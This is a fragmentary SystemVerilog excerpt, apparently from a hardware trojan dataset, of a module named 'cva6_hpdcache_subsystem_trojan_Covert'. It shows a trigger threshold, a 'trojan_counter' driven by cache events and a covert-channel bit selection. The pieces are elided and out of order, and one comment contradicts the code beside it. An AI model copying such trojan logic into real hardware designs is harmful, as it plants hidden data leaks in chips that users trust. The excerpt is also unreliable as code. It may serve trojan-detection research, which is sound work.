...
// Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22261;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_write_data_ready && |icache_miss_resp_valid) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = dcache_write_data_ready[covert_bit_index];  // <-- FIXED: use trigger_signal
...
module cva6_hpdcache_subsystem_trojan_Covert
//  Parameters
//  {{{
#(
